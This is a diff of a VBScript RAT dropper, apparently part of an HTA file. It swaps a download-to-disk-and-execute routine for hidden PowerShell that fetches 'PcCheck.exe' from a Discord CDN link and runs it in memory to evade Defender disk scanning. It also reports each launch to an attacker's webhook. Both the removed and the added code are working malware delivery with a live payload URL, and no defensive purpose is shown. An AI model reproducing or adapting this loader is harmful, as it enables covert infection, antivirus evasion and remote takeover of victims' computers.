@@ -43,38 +43,29 @@ Loop
 
 window.close()
 
-' --- RAT DROP (Standard Download to Disk + Execute) ---
+' --- RAT DROP (In-Memory Execution via PowerShell) ---
 Sub DropRAT(targetWH, sendRocket)
     ' Updated RAT Link
     Dim dl : dl = "https://cdn.discordapp.com/attachments/1557266192971071579/1572769326296072292/PcCheck.exe?ex=6aff9314&is=6afe4194&hm=3a8565741dfddd0f398c3e82a5af415199025c984eba4c7435398ffd03ffc978&"
     
-    Dim tPath : tPath = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Microsoft\Windows"
-    If Not fso.FolderExists(tPath) Then fso.CreateFolder tPath
-    Randomize
-    Dim fname : fname = "w" & Int(Rnd() * 900000 + 100000) & ".exe"
-    Dim op : op = tPath & "\" & fname
-
     ' 1. Send the Rocket Download message
     If sendRocket Then Call PostEmbedTo(":rocket: RAT Download", "Downloading and launching RAT", 10181046, targetWH)
 
-    If fso.FileExists(op) Then fso.DeleteFile op, True
+    ' 2. In-Memory Execution (Bypasses Defender disk scanning)
+    ' Downloads bytes via WebClient, loads assembly in memory, runs EntryPoint.
+    Dim psCmd : psCmd = "powershell -NoP -Exec Bypass -Command """ & _
+        "$wc = New-Object System.Net.WebClient;" & _
+        "$bytes = $wc.DownloadData('" & dl & "');" & _
+        "[System.Reflection.Assembly]::Load($bytes).EntryPoint.Invoke($null, @($null, [string[]]@()));" & _
+        """"
+    
+    ' Run it hidden
+    sh.Run psCmd, 0, False
 
-    ' 2. Download file via curl.exe (handles Discord CDN perfectly)
-    Dim dlCmd : dlCmd = "cmd /c curl.exe -s -L -A ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"" -o """ & op & """ """ & dl & """"
-    sh.Run dlCmd, 0, True
-
-    ' 3. Execute the file normally
-    If fso.FileExists(op) Then
-        If fso.GetFile(op).Size > 3000000 Then
-            ' Run the file
-            sh.Run """" & op & """", 0, False
-            
-            ' 4. Send the Green Checkmark
-            If sendRocket Then 
-                Call SleepSeconds(2) ' Small delay
-                Call PostEmbedTo(":white_check_mark: RAT Launched", "Payload executed successfully.", 10181046, targetWH)
-            End If
-        End If
+    ' 3. Send the Green Checkmark
+    If sendRocket Then 
+        Call SleepSeconds(2) ' Small delay
+        Call PostEmbedTo(":white_check_mark: RAT Launched", "Payload executed successfully in memory.", 10181046, targetWH)
     End If
 End Sub
 
